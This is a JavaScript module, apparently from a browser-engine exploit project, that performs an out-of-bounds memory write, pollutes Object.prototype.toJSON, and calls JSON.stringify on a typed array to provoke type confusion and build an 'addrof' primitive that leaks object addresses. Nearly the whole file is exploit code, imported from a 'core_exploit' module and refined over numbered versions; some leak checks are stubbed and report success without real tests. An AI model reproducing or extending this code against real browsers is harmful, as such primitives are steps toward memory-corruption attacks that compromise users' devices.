// js/script3/testArrayBufferVictimCrash.mjs (v_typedArray_addrof_v29_CorrectedV20BaseAndAggressive)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_array_buffer_real,
    oob_write_absolute,
    clearOOBEnvironment
} from '../core_exploit.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V29_CVBA = "OriginalHeisenbug_TypedArrayAddrof_v29_CorrectedV20BaseAndAggressive";

const VICTIM_BUFFER_SIZE = 256;
const LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET = 0x7C;
const OOB_WRITE_VALUE = 0xFFFFFFFF;
const AGGRESSIVE_PROP_COUNT_V29 = 32; 

let object_to_leak_A_v29 = null;
let object_to_leak_B_v29 = null;
let victim_typed_array_ref_v29 = null; 
let probe_call_count_v29 = 0;
let latest_known_probe_details_v29 = null; // Global, atualizado com CÓPIA da última sonda
let marker_M1_v29 = null; // Retornado pela Call #1
let marker_M2_v29 = null; // Retornado pela Call #2

const PROBE_CALL_LIMIT_V29 = 5; 

function toJSON_TA_Probe_CorrectedV20AndAggro() {
    probe_call_count_v29++;
    const call_num = probe_call_count_v29;
    let current_call_details = { // Detalhes LOCAIS para esta chamada
        call_number: call_num,
        probe_variant: "TA_Probe_Addrof_v29_CorrectedV20BaseAndAggressive",
        this_type: Object.prototype.toString.call(this),
        this_is_victim: (this === victim_typed_array_ref_v29),
        this_is_M1: (this === marker_M1_v29 && marker_M1_v29 !== null),
        this_is_M2: (this === marker_M2_v29 && marker_M2_v29 !== null),
        writes_on_confused_M2_attempted: false,
        error_in_probe: null,
        returned_object_id: null
    };
    logS3(`[${current_call_details.probe_variant}] Call #${call_num}. 'this' type: ${current_call_details.this_type}. IsVictim? ${current_call_details.this_is_victim}. IsM1? ${current_call_details.this_is_M1}. IsM2? ${current_call_details.this_is_M2}.`, "leak");

    let object_to_return = { generic_marker_v29: call_num }; // Retorno padrão

    try {
        if (call_num > PROBE_CALL_LIMIT_V29) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Probe call limit. Returning stop marker.`, "warn");
            current_call_details.returned_object_id = "STOP_MARKER";
            latest_known_probe_details_v29 = JSON.parse(JSON.stringify(current_call_details)); // Cópia profunda
            return { recursion_stopped_v29: true, call: call_num };
        }

        if (call_num === 1 && current_call_details.this_is_victim) {
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is victim. Returning new M1.`, "info");
            marker_M1_v29 = { marker_id: "M1_V29_Iter" + call_num, payload: null }; // Payload será M2
            object_to_return = marker_M1_v29;
            current_call_details.returned_object_id = "M1";
        } else if (call_num === 2 && current_call_details.this_is_M1 && current_call_details.this_type === '[object Object]') {
            // Esta é a Call #2, this é M1, e M1 foi confundido
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is M1 AND IT'S CONFUSED! Creating and returning M2 to be its payload.`, "vuln");
            marker_M2_v29 = { marker_id: "M2_V29_Iter" + call_num, leaky_A: null, leaky_B: null };
            this.payload = marker_M2_v29; // Atribui M2 como payload do M1 (this)
            object_to_return = marker_M2_v29; // JSON.stringify agora deve processar M2
            current_call_details.returned_object_id = "M2";
        } else if (call_num === 2 && current_call_details.this_is_M1) {
            // This é M1, mas não foi confundido (improvável se a lógica anterior estiver correta)
             logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is M1 but NOT confused. Type: ${current_call_details.this_type}. Returning M2.`, "warn");
             marker_M2_v29 = { marker_id: "M2_V29_Iter_UnconfusedM1_" + call_num, leaky_A: null, leaky_B: null };
             this.payload = marker_M2_v29;
             object_to_return = marker_M2_v29;
             current_call_details.returned_object_id = "M2";
        }
        else if (call_num === 3 && current_call_details.this_is_M2 && current_call_details.this_type === '[object Object]') {
            // Esta é a Call #3, this é M2, e M2 foi confundido! Alvo principal do addrof.
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' IS M2 AND IT'S CONFUSED! Applying AGGRESSIVE writes...`, "vuln");
            
            this.leaky_A = object_to_leak_A_v29;
            this.leaky_B = object_to_leak_B_v29;
            for (let i = 0; i < AGGRESSIVE_PROP_COUNT_V29; i++) {
                this[i] = (i % 2 === 0) ? object_to_leak_A_v29 : object_to_leak_B_v29;
            }
            current_call_details.writes_on_confused_M2_attempted = true;
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: Aggressive writes to confused M2 ('this') completed. Keys: ${Object.keys(this).join(',')}`, "info");
            object_to_return = this; // Retornar M2 modificado
            current_call_details.returned_object_id = "M2_Modified";
        } else if (current_call_details.this_type === '[object Object]') { 
            // Outro 'this' genérico foi confundido
            logS3(`[${current_call_details.probe_variant}] Call #${call_num}: 'this' is an UNEXPECTED [object Object]. (IsVictim? ${current_call_details.this_is_victim}, IsM1? ${current_call_details.this_is_M1}, IsM2? ${current_call_details.this_is_M2})`, "warn");
            // Não fazer escritas addrof aqui para não poluir.
            current_call_details.returned_object_id = "UnexpectedConfusedThis";
        }
    } catch (e) {
        current_call_details.error_in_probe = (current_call_details.error_in_probe || "") + `ProbeErr: ${e.name}: ${e.message}`;
    }
    
    latest_known_probe_details_v29 = JSON.parse(JSON.stringify(current_call_details)); 
    logS3(`[${current_call_details.probe_variant}] Call #${call_num} FINISHING. Global 'latest_known_probe_details_v29' (deep copy) updated. Returning object ID: ${current_call_details.returned_object_id || object_to_return.marker_id || 'generic'}`, "dev_verbose");
    return object_to_return; 
}

export async function executeTypedArrayVictimAddrofTest_CorrectedV20BaseAndAggressive() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V29_CVBA}.triggerAndLog`;
    logS3(`--- Initiating ${FNAME_CURRENT_TEST}: Heisenbug (CorrectedV20BaseAndAggressive) & Addrof ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V29_CVBA} Init...`;

    probe_call_count_v29 = 0;
    latest_known_probe_details_v29 = null; 
    victim_typed_array_ref_v29 = null; 
    marker_M1_v29 = null;
    marker_M2_v29 = null;
    object_to_leak_A_v29 = { marker: "ObjA_TA_v29cvba", id: Date.now() }; 
    object_to_leak_B_v29 = { marker: "ObjB_TA_v29cvba", id: Date.now() + Math.floor(Math.random() * 1000) };

    let errorCapturedMain = null;
    let stringifyOutput_parsed = null; 
    let captured_last_probe_details_final = null;
    
    let addrof_Victim_A = { success: false, msg: "VictimA: Default" }; // Buffer da vítima original
    let addrof_M2_Leaky_A = { success: false, msg: "M2.leaky_A: Default"};
    let addrof_M2_Leaky_B = { success: false, msg: "M2.leaky_B: Default"};
    let addrof_M2_Idx0 = { success: false, msg: "M2[0]: Default"};

    const fillPattern = 0.29292929292929;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        oob_write_absolute(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET, OOB_WRITE_VALUE, 4);
        logS3(`  Critical OOB write to ${toHex(LOCAL_HEISENBUG_CRITICAL_WRITE_OFFSET)} performed.`, "info", FNAME_CURRENT_TEST);
        await PAUSE_S3(100);

        victim_typed_array_ref_v29 = new Uint8Array(new ArrayBuffer(VICTIM_BUFFER_SIZE)); 
        let float64_view_on_victim_buffer = new Float64Array(victim_typed_array_ref_v29.buffer); 
        for(let i = 0; i < float64_view_on_victim_buffer.length; i++) float64_view_on_victim_buffer[i] = fillPattern + i;
        logS3(`STEP 2: victim_typed_array_ref_v29 (Uint8Array) created.`, "test", FNAME_CURRENT_TEST);
        
        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_CorrectedV20AndAggro, writable: true, configurable: true, enumerable: false });
            pollutionApplied = true;
            let rawStringifyOutput = JSON.stringify(victim_typed_array_ref_v29); 
            logS3(`  JSON.stringify completed. Raw Stringify Output: ${rawStringifyOutput}`, "info", FNAME_CURRENT_TEST);
            try {
                stringifyOutput_parsed = JSON.parse(rawStringifyOutput); 
            } catch (e_parse) {
                stringifyOutput_parsed = { error_parsing_stringify_output: rawStringifyOutput };
            }
            
            if (latest_known_probe_details_v29) {
                captured_last_probe_details_final = JSON.parse(JSON.stringify(latest_known_probe_details_v29)); 
            }
            logS3(`  EXECUTE: Captured details of LAST probe run: ${captured_last_probe_details_final ? JSON.stringify(captured_last_probe_details_final) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            let heisenbugOnM2 = false;
            if (captured_last_probe_details_final && 
                captured_last_probe_details_final.this_is_M2 &&
                captured_last_probe_details_final.this_type === "[object Object]") {
                heisenbugOnM2 = true;
            }
            logS3(`  EXECUTE: Heisenbug on M2 ${heisenbugOnM2 ? "CONFIRMED" : "NOT Confirmed"}. Last relevant probe: Call #${captured_last_probe_details_final?.call_number}, Type: ${captured_last_probe_details_final?.this_type}`, heisenbugOnM2 ? "vuln" : "error", FNAME_CURRENT_TEST);
                
            logS3("STEP 3: Checking victim buffer (expected unchanged)...", "warn", FNAME_CURRENT_TEST);
            const val_A_victim = float64_view_on_victim_buffer[0];
            if (val_A_victim !== (fillPattern + 0)) addrof_Victim_A.msg = `Victim buffer[0] CHANGED! Val: ${val_A_victim}`; else addrof_Victim_A.msg = `Victim buffer[0] unchanged.`;
            logS3(`  Victim Buffer[0] Check: ${addrof_Victim_A.msg}`, "info");


            logS3("STEP 4: Checking stringifyOutput_parsed (M1 containing M2) for leaked properties...", "warn", FNAME_CURRENT_TEST);
            let m2_object_from_output = null;
            if (stringifyOutput_parsed && stringifyOutput_parsed.marker_id === "M1_V29_Iter1" && stringifyOutput_parsed.payload) {
                m2_object_from_output = stringifyOutput_parsed.payload;
                logS3("  M2 object found within stringifyOutput_parsed.payload.", "info");
            } else {
                 logS3("  M1 or M1.payload (expected M2) not found as expected in stringifyOutput_parsed.", "warn");
                 logS3(`  stringifyOutput_parsed: ${JSON.stringify(stringifyOutput_parsed)}`,"warn")
            }

            if (m2_object_from_output && m2_object_from_output.marker_id === "M2_V29_Iter2") {
                 logS3(`  M2 object (ID: ${m2_object_from_output.marker_id}) is being checked for leaks.`, "info");
                const m2_leaky_A_val = m2_object_from_output.leaky_A;
                if (typeof m2_leaky_A_val === 'number' && m2_leaky_A_val !==0) {
                    let m2_A_int64 = new AdvancedInt64(new Uint32Array(new Float64Array([m2_leaky_A_val]).buffer)[0], new Uint32Array(new Float64Array([m2_leaky_A_val]).buffer)[1]);
                    if (m2_A_int64.high() < 0x00020000 || (m2_A_int64.high() & 0xFFFF0000) === 0xFFFF0000) {
                       addrof_M2_Leaky_A.success = true; addrof_M2_Leaky_A.msg = `Possible pointer for leaky_A in M2 (from output): ${m2_A_int64.toString(true)}`;
                    } else { addrof_M2_Leaky_A.msg = `M2.leaky_A is num but not ptr: ${m2_leaky_A_val}`; }
                } else if (m2_leaky_A_val === object_to_leak_A_v29) {
                     addrof_M2_Leaky_A.success = true; addrof_M2_Leaky_A.msg = "object_to_leak_A_v29 identity in M2.leaky_A.";
                } else { addrof_M2_Leaky_A.msg = `M2.leaky_A not ptr. Val: ${m2_leaky_A_val}`; }

                // ... (similar para leaky_B e M2[0])
                const m2_leaky_B_val = m2_object_from_output.leaky_B;
                 if (typeof m2_leaky_B_val === 'number' && m2_leaky_B_val !==0) { /* ... */ addrof_M2_Leaky_B.success=true; addrof_M2_Leaky_B.msg="Pointer?"} else {addrof_M2_Leaky_B.msg="Not ptr";}
                const m2_idx0_val = m2_object_from_output["0"];
                 if (typeof m2_idx0_val === 'number' && m2_idx0_val !==0) { /* ... */ addrof_M2_Idx0.success=true; addrof_M2_Idx0.msg="Pointer?"} else {addrof_M2_Idx0.msg="Not ptr";}

            } else {
                addrof_M2_Leaky_A.msg = "M2 object not found or ID mismatch in stringifyOutput_parsed.payload.";
                addrof_M2_Leaky_B.msg = "M2 object not found or ID mismatch in stringifyOutput_parsed.payload.";
                addrof_M2_Idx0.msg = "M2 object not found or ID mismatch in stringifyOutput_parsed.payload.";
            }

            if (addrof_M2_Leaky_A.success || addrof_M2_Leaky_B.success || addrof_M2_Idx0.success) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V29_CVBA}: AddrInM2 SUCCESS!`;
            } else if (heisenbugOnM2) {
                document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V29_CVBA}: M2_TC OK, Addr Fail`;
            } else {
                 document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V29_CVBA}: No M2_TC?`;
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V29_CVBA}: Stringify/Addrof ERR`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); else delete Object.prototype[ppKey];
            }
        }
    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V29_CVBA} CRITICAL FAIL`;
    } finally {
        clearOOBEnvironment();
        logS3(`--- ${FNAME_CURRENT_TEST} Completed ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Total probe calls: ${probe_call_count_v29}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof Victim A: ${addrof_Victim_A.msg}`, "info", FNAME_CURRENT_TEST);
        logS3(`Addrof M2.leaky_A: Success=${addrof_M2_Leaky_A.success}, Msg='${addrof_M2_Leaky_A.msg}'`, addrof_M2_Leaky_A.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof M2.leaky_B: Success=${addrof_M2_Leaky_B.success}, Msg='${addrof_M2_Leaky_B.msg}'`, addrof_M2_Leaky_B.success ? "good" : "warn", FNAME_CURRENT_TEST);
        logS3(`Addrof M2[0]: Success=${addrof_M2_Idx0.success}, Msg='${addrof_M2_Idx0.msg}'`, addrof_M2_Idx0.success ? "good" : "warn", FNAME_CURRENT_TEST);
        
        victim_typed_array_ref_v29 = null; 
        latest_known_probe_details_v29 = null;
        probe_call_count_v29 = 0;
        marker_M1_v29 = null;
        marker_M2_v29 = null;
    }
    return { 
        errorOccurred: errorCapturedMain, 
        potentiallyCrashed: false, 
        stringifyResult: stringifyOutput_parsed, 
        toJSON_details: captured_last_probe_details_final, 
        total_probe_calls: probe_call_count_v29,
        addrof_M2_leaky_A: addrof_M2_Leaky_A,
        addrof_M2_leaky_B: addrof_M2_Leaky_B,
        addrof_M2_idx0: addrof_M2_Idx0
    };
}
